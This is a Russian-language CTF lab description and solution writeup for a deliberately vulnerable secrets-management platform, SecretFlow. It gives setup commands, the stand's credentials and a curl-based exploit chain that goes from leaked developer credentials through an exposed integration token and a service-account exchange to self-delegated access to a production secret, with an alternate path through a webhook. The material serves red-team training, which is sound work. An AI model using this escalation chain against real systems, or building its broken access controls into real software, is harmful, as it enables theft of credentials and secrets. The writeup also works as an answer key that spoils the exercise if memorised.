---
difficulty:
  - Средний
office:
  - IT и телекоммуникация
segment:
  - SRV
tags:
  - web
  - api
  - secrets
  - ctf
interface: ens18 / netplan
vulns: IDOR, CWE-284, CWE-256, Confused Deputy
os: Debian 12
hostname: secretflow.city.stf
git: https://github.com/example/secretflow
---

> [!info] Information
> Hostname: **`secretflow.city.stf`**
> Difficulty: **`Средний`**
> Office: **`IT и телекоммуникация`**
> Segment: **`SRV`**
> Git: **`https://github.com/example/secretflow`**
> Tags: **`web, api, secrets, ctf`**
> Interface: **`ens18 / netplan`**
> OS: **`Debian 12`**

> [!error] Критическое событие
> Утечка CRITICAL-секрета `PROD_DB_MASTER_PASSWORD` из внутренней платформы управления секретами SecretFlow.

> [!question] Задача
> Получите доступ к CRITICAL-секрету `PROD_DB_MASTER_PASSWORD` через эксплуатацию уязвимостей приложения и подтвердите успешную компрометацию флагом.

> [!info] Легенда
> Компания запустила внутренний сервис SecretFlow для управления доступом к секретам инфраструктуры. Платформа используется разработчиками, тимлидами и security-командой для выдачи временных доступов к ключам и паролям продакшена.
>
> За сутки до запуска учений в корпоративном чате появилась выгрузка из старого трекера задач, куда по ошибке попали тестовые данные onboarding. В выгрузке обнаружены рабочие учетные данные разработчика:
>
> - `dev.alice`
> - `password123`
>
> По официальной версии это «устаревшие тестовые креды», но вход в систему по ним работает. Ваша цель как участника red-team — проверить, можно ли с минимального доступа эскалировать привилегии и добраться до CRITICAL-секретов.
>
> Важно: утечка `dev.alice/password123` должна присутствовать в легенде и использоваться как начальная точка атаки.

<div style="page-break-after: always;"></div>

# Донастройка хоста

## Смена FQDN

```bash
sed -i 's/secretflow\.city\.stf/YOUR_FQDN/g' /etc/hosts
hostnamectl set-hostname YOUR_FQDN
reboot now
```

## Запуск стенда

```bash
cd /opt/secretflow
cp .env.example .env
docker compose up -d --build
```

## Проверка доступности

```bash
curl -s http://127.0.0.1:8080/health
curl -I http://127.0.0.1:3000
```

<div style="page-break-after: always;"></div>

# Уязвимый стенд

## Статус сервисов

```bash
docker compose ps
```

Отметьте галочками:
✅ Уязвимую машину можно **перезапускать**  
✅ Последний снапшот должен быть **с памятью**  
✅ Сервису нужен доступ **в Интернет**

## Смена флагов

```bash
# Пример: заменить флаг в миграции (перед сборкой нового образа)
sed -i 's/flag{prod_db_master_[^}]\+}/YOUR_FLAG_HERE/g' /opt/secretflow/backend/migrations/001_initial_schema.sql
```

# Работающие процессы и сервисы

| Service | Address | Description |
|---|---|---|
| secretflow-frontend | 0.0.0.0:3000 | Web UI |
| secretflow-backend | 0.0.0.0:8080 | API |
| secretflow-db | internal docker network only | PostgreSQL |

Сеть настроена через **Docker bridge**.

<div style="page-break-after: always;"></div>

# Доступы

| # | Login | Pass |
|---|---|---|
| app user | `dev.alice` | `password123` |
| db app user | `${DB_USER}` (из `.env`) | `${DB_PASSWORD}` (из `.env`) |
| app admin | `security.dave` | `not disclosed` |

# Пароли для брута

НЕТ

# Writeup

## Шаг 1 - Сбор информации

Проверяем доступность приложения и API:

```bash
curl -s http://127.0.0.1:8080/health
curl -I http://127.0.0.1:3000
```

Авторизуемся под утекшей учеткой `dev.alice`:

```bash
TOKEN=$(curl -s -X POST http://127.0.0.1:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"dev.alice","password":"password123"}' | jq -r '.token')

echo "$TOKEN"
```

Проверяем, что токен валиден:

```bash
curl -s http://127.0.0.1:8080/api/auth/me \
  -H "Authorization: Bearer $TOKEN"
```

## Шаг 2 - Разведка и поиск целевого секрета

### 2.1 Разведка через DevTools (как найти endpoint'ы)

1. Открыть приложение `http://127.0.0.1:3000` и войти под `dev.alice`.
2. Открыть DevTools:
   - Chrome/Edge: `F12` или `Ctrl+Shift+I`
   - Firefox: `F12`
3. Перейти во вкладку `Network`.
4. Включить фильтр `Fetch/XHR`.
5. Отметить `Preserve log`, чтобы запросы не очищались при переходах.
6. В поле фильтра ввести `/api/`, чтобы видеть только backend-вызовы.
7. Пройти по ключевым страницам UI:
   - `Dashboard`
   - `Secrets`
   - `My Requests`
   - Открыть любой секрет
8. По каждому найденному запросу смотреть:
   - `Request URL`
   - `Request Method`
   - `Status Code`
   - `Request Payload` (для POST)
   - `Response`
9. Для повторения запроса:
   - ПКМ по запросу -> `Copy` -> `Copy as cURL`
   - Вставить в терминал и адаптировать под свой токен.

Обычно на этом хосте обнаруживаются такие endpoint'ы:
- `POST /api/auth/login`
- `GET /api/auth/me`
- `GET /api/secrets`
- `GET /api/secrets/:id`
- `GET /api/secrets/:id/value`
- `POST /api/secrets/:id/request`
- `GET /api/delegate/info`
- `POST /api/service-account/exchange`
- `POST /api/delegate/access`
- `POST /api/integrations/webhook`

### 2.1.1 Быстрый способ через Sources (по коду фронта)

Если нужно быстрее собрать список endpoint'ов без кликанья по страницам:

1. Открыть DevTools -> `Sources`.
2. Открыть основной JS-бандл (`/assets/index-*.js`).
3. Нажать глобальный поиск:
   - Windows/Linux: `Ctrl+Shift+F`
   - macOS: `Cmd+Option+F`
4. Искать строку: `"/api/` или просто `api/`.
5. По найденным местам выписать endpoint'ы из вызовов `fetch(...)` / API-клиента.

Плюс метода:
- Можно быстро увидеть почти все роуты сразу.
- Не зависит от того, какие экраны вы уже открыли в UI.

### 2.2 Поиск целевого секрета

Получаем список секретов и находим `PROD_DB_MASTER_PASSWORD`:

```bash
curl -s http://127.0.0.1:8080/api/secrets \
  -H "Authorization: Bearer $TOKEN" | jq .
```

Сохранить UUID целевого секрета:

```bash
SECRET_ID="<uuid-prod-db-master-password>"
```

### 2.3 Проверка подсказок delegation-flow

Проверяем подсказки по delegation-flow:

```bash
curl -s http://127.0.0.1:8080/api/delegate/info \
  -H "Authorization: Bearer $TOKEN" | jq .
```

## Шаг 3 - Эксплуатация (вариант HARD, основной)

Сначала извлекаем интеграционный токен из operational endpoint:

```bash
INTEGRATION_TOKEN=$(curl -s http://127.0.0.1:8080/api/internal/integrations/status \
  -H "Authorization: Bearer $TOKEN" | jq -r '.integrations[0].auth_token')

echo "$INTEGRATION_TOKEN"
```

Обмениваем integration token на JWT service account:

```bash
SERVICE_TOKEN=$(curl -s -X POST http://127.0.0.1:8080/api/service-account/exchange \
  -H "Content-Type: application/json" \
  -d "{\"integration_token\":\"$INTEGRATION_TOKEN\",\"purpose\":\"CI/CD debugging session\"}" \
  | jq -r '.service_token')

echo "$SERVICE_TOKEN"
```

Получаем свой user id:

```bash
MY_ID=$(curl -s http://127.0.0.1:8080/api/auth/me \
  -H "Authorization: Bearer $TOKEN" | jq -r '.user.id')

echo "$MY_ID"
```

Делегируем доступ самому себе на CRITICAL-секрет:

```bash
curl -s -X POST http://127.0.0.1:8080/api/delegate/access \
  -H "Authorization: Bearer $SERVICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{
    \"secret_id\": \"$SECRET_ID\",
    \"target_user_id\": \"$MY_ID\",
    \"justification\": \"Temporary access for debugging\",
    \"duration_hours\": 24
  }" | jq .
```

Читаем значение секрета:

```bash
curl -s http://127.0.0.1:8080/api/secrets/$SECRET_ID/value \
  -H "Authorization: Bearer $TOKEN" | jq .
```

## Шаг 4 - Альтернативная эксплуатация (MEDIUM)

Если хотите короткий путь через webhook:

```bash
curl -s -X POST http://127.0.0.1:8080/api/integrations/webhook \
  -H "Content-Type: application/json" \
  -d "{
    \"token\": \"gf_prod_abc123xyz789\",
    \"secret_id\": \"$SECRET_ID\",
    \"justification\": \"Automated deployment\"
  }" | jq .
```

## Шаг 5 - Реализация критического события

Критическое событие считается выполненным, когда получено значение:

```json
{
  "secret": {
    "name": "PROD_DB_MASTER_PASSWORD",
    "value": "flag{...}"
  }
}
```

Сохраните полученный `flag{...}` как подтверждение успешной компрометации.
